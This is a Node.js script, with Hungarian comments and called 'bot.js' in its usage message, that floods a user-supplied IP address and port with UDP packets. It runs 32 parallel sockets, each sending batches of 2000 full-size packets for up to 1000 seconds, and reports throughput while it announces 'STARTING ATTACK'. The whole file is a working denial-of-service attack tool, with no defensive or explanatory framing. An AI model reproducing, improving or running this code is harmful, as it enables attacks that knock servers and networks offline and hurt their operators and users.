process.noDeprecation = true;

const dgram = require('dgram');
const { performance } = require('perf_hooks');

// Beállítások
const DURATION = 1000;         // Támadás ideje másodpercben
const PACKET_SIZE = 1472;    // Csomag mérete (MTU optimalizált)
const WORKERS = 32;          // Párhuzamos szálak száma
const BATCH = 2000;          // Egy körben küldött csomagok száma
const BIND_PORT_START = 50000; // Helyi portok indítása

// Ellenőrzés, hogy megadták-e a paramétereket
if (process.argv.length !== 4) {
  console.error('Használat: node bot.js <cél-ip> <cél-port>');
  process.exit(1);
}

const TARGET_HOST = process.argv[2];
const TARGET_PORT = Number(process.argv[3]);

if (!TARGET_HOST || isNaN(TARGET_PORT) || TARGET_PORT < 1 || TARGET_PORT > 65535) {
  console.error('Érvénytelen IP cím vagy port');
  process.exit(1);
}

// Puffer létrehozása (csupa "A" betű)
const FIXED_BUFFER = Buffer.allocUnsafe(PACKET_SIZE);
FIXED_BUFFER.fill(0x41);

let running = false;
let stop = null;

function ultraBlast() {
  if (running) return;
  running = true;

  console.log(`\nSTARTING ATTACK → ${TARGET_HOST}:${TARGET_PORT}`);
  const sockets = [];
  let packets = 0;
  let bytes = 0;
  
  const start = performance.now();
  const endTime = start + DURATION * 1000;

  // Leállítási funkció
  stop = () => {
    if (!running) return;
    running = false;
    sockets.forEach(s => { try { s.close(); } catch {} });
  };

  // Munkások (socketek) indítása
  for (let i = 0; i < WORKERS; i++) {
    const sock = dgram.createSocket('udp4');
    const localPort = BIND_PORT_START + i;

    sock.bind(localPort, () => {
      let pending = 0;

      const send = () => {
        if (!running || performance.now() >= endTime || pending >= BATCH) return;

        for (let j = 0; j < BATCH && running; j++) {
          pending++;
          sock.send(FIXED_BUFFER, TARGET_PORT, TARGET_HOST, () => {
            if (running) {
              packets++;
              bytes += PACKET_SIZE;
              pending--;
            }
          });
        }
        if (running) setImmediate(send);
      };
     
      send();
    });

    sock.on('error', () => {});
    sockets.push(sock);
  }

  // Statisztika kiírása 100ms-enként
  const stats = setInterval(() => {
    if (!running) return;
    const elapsed = (performance.now() - start) / 1000;
    const mbps = elapsed > 0 ? (bytes * 8) / (elapsed * 1e6) : 0;
    process.stdout.write(
      `\r${elapsed.toFixed(0)}s | ${packets.toLocaleString()} pkt ` +
      `| ${(bytes/1e6).toFixed(0)} MB | ${mbps.toFixed(0)} Mbps`
    );
  }, 100);

  // Időzítő a leálláshoz
  setTimeout(() => {
    stop();
    clearInterval(stats);
    const total = (performance.now() - start) / 1000;
    const avg = total > 0 ? (bytes * 8) / (total * 1e6) : 0;
    console.log(
      `\nCOMPLETED: ${(bytes/1e6).toFixed(0)} MB | ${avg.toFixed(0)} Mbps\n`
    );
    process.exit(0);
  }, DURATION * 1000 + 1000);
}

// CTRL+C kezelése
process.on('SIGINT', () => {
  console.log('\nSTOPPING ATTACK...');
  if (stop) stop();
  setTimeout(() => process.exit(0), 500);
});

// Indítás
ultraBlast();